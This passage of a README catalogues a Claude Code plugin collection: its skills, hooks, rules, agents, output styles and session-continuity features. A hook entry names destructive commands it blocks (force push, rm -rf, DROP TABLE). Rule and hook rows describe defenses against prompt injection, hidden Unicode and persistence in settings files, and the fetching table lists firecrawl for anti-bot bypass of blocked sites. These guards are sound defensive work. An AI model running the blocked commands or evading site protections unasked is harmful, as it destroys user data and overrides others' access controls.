| [ffmpeg-ops](skills/ffmpeg-ops/) | ffmpeg/ffprobe operations - probe-first cookbook (transcode, cut/concat, GIF, subtitles, HLS), --doctor triage with fix commands, EDL-driven editing, STT/Whisper prep, VMAF quality gates, chapter authoring, target-size compression, scrub-preview sprites, hw-encoder verification, and a full grading wing: ~40-look recipe catalog, 32 parametric LUTs (mono/duo/tritone tone maps), Hald-CLUT extraction, scope-matching doctrine. 11 protocol scripts, 19 references, 107-assertion suite |
| [ytdlp-ops](skills/ytdlp-ops/) | yt-dlp acquisition layer feeding ffmpeg-ops - format selection that avoids transcodes (-S sort), clip-at-download sections, STT audio extraction, archive-driven channel syncs, cookies/auth, SponsorBlock, failure triage (nsig = outdated). Staleness verifier wired into CI + freshness |
| [structural-search](skills/structural-search/) | Search code by AST structure with ast-grep |
| [log-ops](skills/log-ops/) | Log analysis, JSONL processing, cross-log correlation, timeline reconstruction |
| [leveldb-ops](skills/leveldb-ops/) | Read Chromium/Electron LevelDB stores (Local Storage, IndexedDB) - app-state forensics |

#### Workflow Skills
| Skill | Description |
|-------|-------------|
| [tool-discovery](skills/tool-discovery/) | Recommend agents and skills for any task |
| [git-ops](skills/git-ops/) | Git orchestrator - commits, PRs, releases, changelog. Routes to background Sonnet agent. |
| [github-ops](skills/github-ops/) | GitHub remote ops - repo create/metadata/topics, releases + README 'Recent Updates' enforcement, issue/PR management (preview-before-send), and read-only security-posture audit + scored repo-scorecard (single repo or whole `--org`) |
| [push-gate](skills/push-gate/) | Pre-push safety gate - gitleaks + regex secret scan, forbidden-file check, no bypass |
| [parallel-ops](skills/parallel-ops/) | Router for parallel/recurring agent work - decision table over fleet-ops, fleet-worker, fleetflow (own repo), loop-ops, iterate, spawn |
| [fleet-ops](skills/fleet-ops/) | Manage a fleet of concurrent Claude sessions - landing queue with test gate, pre-land scrub (experimental) |
| [fleet-worker](skills/fleet-worker/) | Delegate tasks to cheap headless GLM (or any Anthropic-compatible) workers - per-task git worktree + isolated config, result gating, fan-out that hands winning branches to fleet-ops landing |
| [summon](skills/summon/) | Claude Desktop session toolbox - cross-account transfer, recovery picker, cwd rebind, store doctor |
| [doc-scanner](skills/doc-scanner/) | Scan and synthesize project documentation |
| [repo-doctor](skills/repo-doctor/) | Audit any repo against the agentic-quality doctrine - entry docs, comment contracts, structure, enforcement gates, doc-pairing; scorer with --json + CI --strict, plus comment-doctrine / entry-docs / monorepo-structure references |
| [adr-ops](skills/adr-ops/) | Architecture Decision Records - when-to-write, canonical format, supersession lifecycle, scaffold/index/lint tools |
| [okf-ops](skills/okf-ops/) | Open Knowledge Format - assess a doc repo's frontmatter-readiness, validate a bundle for conformance, decide per-repo adoption |
| [project-planner](skills/project-planner/) | Track stale plans, suggest session commands |
| [python-env](skills/python-env/) | Fast Python environment management with uv |
| [task-runner](skills/task-runner/) | Run project commands with just |
| [screenshot](skills/screenshot/) | Find and display recent screenshots from common screenshot directories |
| [pigeon](skills/pigeon/) | Inter-session pmail - send/receive messages between Claude Code sessions across projects. SQLite-backed (`~/.claude/pmail.db`), git-rooted project identity, threading, attachments, broadcast, search. Hook-driven notifications. Per-project disable. |

#### Development Skills
| Skill | Description |
|-------|-------------|
| [auto-skill](skills/auto-skill/) | Automatically detect skill-worthy workflows and create reusable skills. Stop hook suggests after complex sessions (8+ mutating ops across 4+ tool types). Agent Skills spec compliant with quality gates and duplicate detection. Toggle with `/auto-skill on/off`. |
| [skill-creator](skills/skill-creator/) | Guide for creating effective skills with specialized knowledge, workflows, and tool integrations. |
| [explain](skills/explain/) | Deep explanation of complex code, files, or concepts. Routes to expert agents. |
| [spawn](skills/spawn/) | Generate PhD-level expert agent prompts for Claude Code. |
| [atomise](skills/atomise/) | Atom of Thoughts reasoning - decompose problems into atomic units. |
| [setperms](skills/setperms/) | Set tool permissions and CLI preferences in .claude/ directory. |
| [introspect](skills/introspect/) | Analyze previous session logs without consuming current context. |
| [review](skills/review/) | Code review with semantic diffs, expert routing, and auto-TaskCreate. |
| [testgen](skills/testgen/) | Generate tests with expert routing and framework detection. |
| [techdebt](skills/techdebt/) | Technical debt detection using parallel subagents. |
| [migrate-ops](skills/migrate-ops/) | Framework/language migration patterns, version upgrades, codemods |
| [refactor-ops](skills/refactor-ops/) | Safe refactoring patterns, code smell detection, test-driven methodology |
| [scaffold](skills/scaffold/) | Project scaffolding - generate boilerplate for APIs, web apps, CLIs, monorepos |
| [iterate](skills/iterate/) | Autonomous improvement loop - modify, measure, keep or discard, repeat. Inspired by Karpathy's autoresearch. |
| [loop-ops](skills/loop-ops/) | Outer-loop design discipline - the orchestration layer above `iterate`: risk-tier ladder (L1 report → L2 assisted → L3 unattended) mapped onto Claude Code's permission model, STATE/run-log/budget spine, a 13-pattern morphology (cadence/event/goal × L1–L3 × cloud/local), multi-loop coordination, kill switch. Composes iterate/fleet-worker/fleet-ops/native-loop. loop-scaffold/loop-check/loop-estimate scripts. |
| [testing-ops](skills/testing-ops/) | Test strategy patterns - mocking, CI testing, test data design |
| [evals-ops](skills/evals-ops/) | Evals for LLM/agent systems - outcome vs step vs trajectory scoring, golden-set construction and freeze discipline, LLM-as-a-judge bias control and Cohen-kappa calibration, adversarial refuters, blocking-vs-advisory CI gates, cost/latency attribution. McNemar paired-significance testing, RAG retrieval eval, annotation workflow, and hillclimbing discipline (pairs with `iterate`). judge-calibration/goldenset-audit/eval-baseline scripts plus golden-set, rubric, runner and CI-gate templates. |
| [claude-code-ops](skills/claude-code-ops/) | Claude Code internals - full hook event catalog, skill frontmatter spec, headless/CLI reference, extension debugging |
| [playwright-ops](skills/playwright-ops/) | Playwright e2e testing - selector hierarchy, fixtures, network mocking, CI sharding, flake hunting |

### Hooks

| Hook | Type | Description |
|------|------|-------------|
| [pre-commit-lint.sh](hooks/pre-commit-lint.sh) | PreToolUse | Auto-lint staged files before commit (JS/TS, Python, Go, Rust, PHP) |
| [post-edit-format.sh](hooks/post-edit-format.sh) | PostToolUse | Auto-format files after Write/Edit (Prettier, Ruff, gofmt, rustfmt) |
| [dangerous-cmd-warn.sh](hooks/dangerous-cmd-warn.sh) | PreToolUse | Block destructive commands (force push, rm -rf, DROP TABLE) |
| [enforce-uv.sh](hooks/enforce-uv.sh) | PreToolUse | Enforce uv over pip/bare tools in uv projects (`pip install` → `uv add`, bare `pytest`/`ruff` → `uv run`) |
| [pre-install-scan.sh](hooks/pre-install-scan.sh) | PreToolUse | Advisory on dependency installs (npm/pnpm/yarn/bun/pip/uv/poetry/composer/gem/cargo, incl. `composer update`) - route through Socket, respect cooldown; `SUPPLY_CHAIN_BLOCK=1` for a hard gate |
| [manifest-dep-scan.sh](hooks/manifest-dep-scan.sh) | PostToolUse | Advisory when the agent edits a dependency manifest (package.json/requirements/composer.json/Cargo.toml/go.mod/Gemfile) - depscore + cooldown the added package; silent on version bumps |
| [check-mail.sh](hooks/check-mail.sh) | PreToolUse | Check for unread pmail via signal file (no cooldown, zero-cost when empty) |
| [session-start-unicode-scan.sh](hooks/session-start-unicode-scan.sh) | SessionStart | One-shot hidden-Unicode scan of project instruction files at boot (silent on clean) |
| [pre-commit-unicode-scan.sh](hooks/pre-commit-unicode-scan.sh) | Git pre-commit | Block commits that add critical hidden Unicode (bidi, tag-block) to instruction files |
| [config-change-guard.sh](hooks/config-change-guard.sh) | ConfigChange | Scan changed Claude settings files for worm-persistence IOCs the moment they're edited (advisory; `SUPPLY_CHAIN_BLOCK=1` to deny) |
| [worktree-guard.sh](hooks/worktree-guard.sh) | PreToolUse | Warn on commands that touch other sessions' `.claude/worktrees/` (rm, worktree remove/prune, sweeping `git add -A`, double-force `git clean -ff`); `WORKTREE_GUARD_BLOCK=1` to deny |
| [pre-write-peer-guard.sh](hooks/pre-write-peer-guard.sh) | PreToolUse | Mid-session peer-writer guard — warn before writing a file a live peer session in the same checkout just modified (collisions happen during a session, not only at boot); pairs with session-touched-ledger.sh |
| [session-touched-ledger.sh](hooks/session-touched-ledger.sh) | PostToolUse | Record files this session has written so the peer-writer guard can tell own edits from a peer's (silent, never blocks) |

### Output Styles

| Style | Personality | Best For |
|-------|-------------|----------|
| [Vesper](output-styles/vesper.md) | Sophisticated British wit, intellectual depth | General development work |
| [Spartan](output-styles/spartan.md) | Minimal, bullet-points only | Quick tasks, CI output |
| [Mentor](output-styles/mentor.md) | Patient, educational | Learning, onboarding |
| [Executive](output-styles/executive.md) | High-level summaries | Non-technical stakeholders |
| [Pair](output-styles/pair.md) | Thinks out loud, explores together | Collaborative problem-solving |
| [Atlas](output-styles/atlas.md) | Strategic advisor, systems thinking | Architecture, planning |
| [Coach](output-styles/coach.md) | Celebrates wins, pushes to level up | Momentum, motivation |
| [Harbour](output-styles/harbour.md) | Warm, steady, calm in the storm | Complex or stressful tasks |
| [Meridian](output-styles/meridian.md) | Chief of staff, anticipatory | Project coordination |
| [Noir](output-styles/noir.md) | Hard-boiled detective, Chandler meets SRE | Debugging, investigations |
| [Roast](output-styles/roast.md) | Brutally honest friend | Code review, improvement |
| [Sage](output-styles/sage.md) | Thoughtful, measured, precise | Post-mortems, analysis |
| [Scout](output-styles/scout.md) | Curious, lateral, challenges assumptions | Design, problem reframing |

### Agents

> **Skills-first (v3.0):** language/framework expert agents (python-expert, react-expert, etc.) were
> deprecated in favour of their `-ops` skill twins — unique agent content was folded into the skills.
>
> **Why, per Anthropic's guidance:** skills and subagents solve different problems. A subagent's value is
> *context isolation* — it runs in a separate context window so a large, noisy investigation returns only its
> distilled result to the main thread. Skills are the home for *knowledge*: thanks to progressive disclosure
> they cost ~100 tokens (name + description) until they're relevant, then load their body and references on
> demand. A `python-expert` agent that only carried Python knowledge used none of the isolation benefit — it
> was a knowledge container paying a dispatch cost, and it duplicated the `python-*-ops` skills (5 of the 11
> retired agents had *no* content their skill twin lacked). Knowledge belongs in skills; subagents are reserved
> for delegation that needs its own context or model.
>
> Delegation stays where it earns its keep: dispatching skills (review, testgen, perf-ops, security-ops,
> explain) still route to `general-purpose` agents — but those agents now *preload the relevant skill* for
> their knowledge. Subagent = the isolation mechanism, skill = the knowledge it loads. The agents below remain
> because they have no skill twin (a distinct capability, or — like git-agent — a real background-worker role
> that uses the isolation boundary).
>
> The end state is clean: **every domain-knowledge agent is now a skill**, and the only agents left are the
> three whose value *is* the isolation mechanism — git-agent (a background worker), firecrawl-expert (large
> noisy scrapes), and project-organizer (bulk filesystem restructure).
>
> Sources: [Agent Skills](https://code.claude.com/docs/en/skills) — progressive disclosure and on-demand
> loading; [Subagents](https://code.claude.com/docs/en/sub-agents) — a separate context window for delegated work.

| Agent | Description |
|-------|-------------|
| [firecrawl-expert](agents/firecrawl-expert.md) | Web scraping, crawling, parallel fetching, structured extraction |
| [git-agent](agents/git-agent.md) | Background git operations - commits, PRs, releases (Sonnet) |
| [project-organizer](agents/project-organizer.md) | Reorganize directory structures, cleanup |

### Rules

| Rule | Description |
|------|-------------|
| [cli-tools.md](rules/cli-tools.md) | Modern CLI tool preferences (fd, rg, eza, bat, etc.) |
| [commit-style.md](rules/commit-style.md) | Conventional commits format and examples |
| [naming-conventions.md](rules/naming-conventions.md) | Component naming patterns for agents, skills, commands |
| [prompt-injection.md](rules/prompt-injection.md) | Instruction-integrity defense - scan-on-entry, sanitize-on-ingest, hidden-Unicode hygiene |
| [skill-agent-updates.md](rules/skill-agent-updates.md) | Mandatory docs check before creating/updating skills or agents |
| [supply-chain.md](rules/supply-chain.md) | Behavioural-first dependency hygiene - scan before adding, day-zero cooldown, OIDC audit, persistence-hook awareness |
| [worktree-boundaries.md](rules/worktree-boundaries.md) | Never touch other sessions' worktrees - no rm -rf, no git add -A sweeping gitlinks |
| [loop-engineering.md](rules/loop-engineering.md) | Graduated-autonomy discipline for scheduled/autonomous agent loops - L1→L2→L3, scheduler-not-session, escalation gate, kill switch + budget; companion to loop-ops |
| [agentic-quality.md](rules/agentic-quality.md) | Code, comments, and structure that survive the session - cold-agent test, comment doctrine (contract blocks, WHY-only, guard comments), entry-doc standard, file-size discipline, test doctrine (seen failing, named for the bug, boundary-first, no coverage targets), docs indexing + pairing; companion to repo-doctor |
| [deploy-gating.md](rules/deploy-gating.md) | Child sessions never deploy - background agents, chips, headless runs and CI-autofix loops build, test and commit, then stop at the deploy boundary; a merge to an auto-deploying branch counts as a deploy; only a live instruction in the user's own session authorises one |
| [dev-servers.md](rules/dev-servers.md) | Never start local dev servers ad-hoc - register them under a supervised stack (e.g. process-compose + portless) with a port registry; generic template - concrete values live in a private CLAUDE.md; companion to process-compose-ops/portless-ops |
| [modern-tools.md](rules/modern-tools.md) | Which-tool enforcement when generating commands - default modern (uv, fd, rg, sd), footnote legacy; companion to cli-tools.md |
| [public-posts.md](rules/public-posts.md) | Preview-before-send for public surfaces - quote the verbatim draft and wait for explicit approval before gh comments, PRs, or any external post |
| [release-review.md](rules/release-review.md) | Never auto-publish GitHub releases - push commit+tag, stop, surface the diff for human review before gh release create |
| [shell-preference.md](rules/shell-preference.md) | Speak the user's shell, never assume bash - shell-detection signals plus a worked PowerShell 5.1 example with the bash-to-PowerShell translation table |

### Tools & Hooks

| Resource | Description |
|----------|-------------|
| [tools/](tools/) | Modern CLI toolkit - token-efficient replacements for legacy commands |
| [hooks/](hooks/) | Hook examples for pre/post execution automation |

#### Web Fetching Hierarchy

When fetching web content, tools are used in this order:

| Priority | Tool | When to Use |
|----------|------|-------------|
| 1 | `WebFetch` | First attempt - fast, built-in |
| 2 | `r.jina.ai/URL` | JS-rendered pages, PDFs, cleaner extraction |
| 3 | `firecrawl <url>` | Anti-bot bypass, blocked sites (403, Cloudflare) |
| 4 | `firecrawl-expert` agent | Complex scraping, structured extraction |

See [tools/README.md](tools/README.md) for full documentation and install scripts.

## Testing & Validation

Validate all extensions before committing:

```bash
cd tests

# Run full validation (requires just)
just test

# Or run directly
bash validate.sh

# Windows
powershell validate.ps1
```

### What's Validated
- YAML frontmatter syntax
- Required fields (name, description)
- Naming conventions (kebab-case)
- File structure (agents/*.md, skills/*/SKILL.md)
- Plugin manifests (`.claude-plugin/plugin.json` + `marketplace.json`) via the authoritative `claude plugin validate`, plus a guard against a stray root `marketplace.json`

### Available Tasks

```bash
cd tests
just              # List all tasks
just test         # Run full validation
just validate-yaml # YAML only
just validate-names # Naming only
just stats        # Count extensions
just list-agents  # List all agents
```

## Session Continuity

Claude Code remembers conversation history (`--resume`), Claude-curated learnings (auto-memory) and in-session checkpoints (`/rewind`) - all machine-local, and none of it is **task state**. Tasks are session-scoped and deleted when the session ends, by design.

`/save` + `/sync` add the piece that's missing: a state file you control, in your repo - task restore, structured git/PR context, explicit handoff notes and session-ID bridging - so a session can be resumed on another machine, reviewed in a diff, or handed to a teammate. It implements the pattern from Anthropic's [Effective Harnesses for Long-Running Agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents): every session makes incremental progress, then leaves structured updates.

```
/sync                              # bootstrap + restore saved state
[work]
/save "Stopped at auth module"     # writes .claude/session-cache.json + MEMORY.md
```

Use all three together: `--resume` for conversation, auto-memory for learnings, `/sync` for tasks and handoff. The persistence matrix, the full workflow and the `session-cache.json` schema live in [docs/SESSION-CONTINUITY.md](docs/SESSION-CONTINUITY.md).

## Updating

```bash
git pull
```

Then re-run the install script to update your global Claude configuration.

## Performance Tips

### MCP Tool Search

Tool Search is **on by default**: MCP tool definitions are deferred and loaded on demand instead of consuming context at session start. Three things are worth knowing:

- **It silently switches off behind a proxy.** When `ANTHROPIC_BASE_URL` points at a non-first-party host - a `fleet-worker` on GLM via z.ai, or any LLM gateway - Claude Code loads every tool upfront, because most proxies don't forward `tool_reference` blocks. Set `ENABLE_TOOL_SEARCH=true` explicitly if yours does.
- **Threshold mode** - `ENABLE_TOOL_SEARCH=auto` loads tools upfront until their definitions reach 10% of the context window, then defers all of them.
- **Exempt what you use every turn** - `"alwaysLoad": true` on a server entry (or `"anthropic/alwaysLoad": true` in a tool's `_meta`) keeps it in context regardless.

Requires a model that supports `tool_reference` blocks: Sonnet 4.5, Haiku 4.5, Opus 4.5 and later. Docs: [Scale with MCP tool search](https://code.claude.com/docs/en/mcp#scale-with-mcp-tool-search).

### Skill Description Budget

With 90+ skills installed (this plugin alone ships 109), skill descriptions can overflow the listing budget. All skill names are always listed, but descriptions share a budget of **1% of the model context window** — on overflow, least-invoked skills lose their descriptions first and **silently stop auto-triggering** (explicit `/name` invocation still works). Each skill's combined `description` + `when_to_use` is also truncated at **1,536 chars**, so trigger phrases belong at the front.

- **Check:** run `/doctor` — it shows whether the budget is overflowing and which skills are affected.
- **Fix:** demote or disable skills you don't use via `skillOverrides` in settings (`"on"` / `"name-only"` / `"user-invocable-only"` / `"off"` per skill, or `/skills` + `Space`). Plugin skills are managed via `/plugin` instead.
- **Or raise the budget:** `skillListingBudgetFraction` setting (e.g. `0.02`), `SLASH_COMMAND_TOOL_CHAR_BUDGET` env var for a fixed char count, or `maxSkillDescriptionChars` for the per-skill cap.

### Skills Over Commands

Most functionality lives in skills rather than commands. Skills get slash-hint discovery via trigger keywords and load on-demand, reducing context overhead. Only session management (`/sync`, `/save`) remains as commands.

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the component model, and [docs/SKILL-CREATION-PROTOCOL.md](docs/SKILL-CREATION-PROTOCOL.md) for how to build a new skill.

## Resources

- [Claude Code Best Practices](https://www.anthropic.com/engineering/claude-code-best-practices) — Official Anthropic guide
- [Claude Code Plugins](https://claude.com/blog/claude-code-plugins) — Plugin system documentation
- [Effective Harnesses for Long-Running Agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents) — The pattern behind `/save`

---

*Extend Claude Code. Your way.*
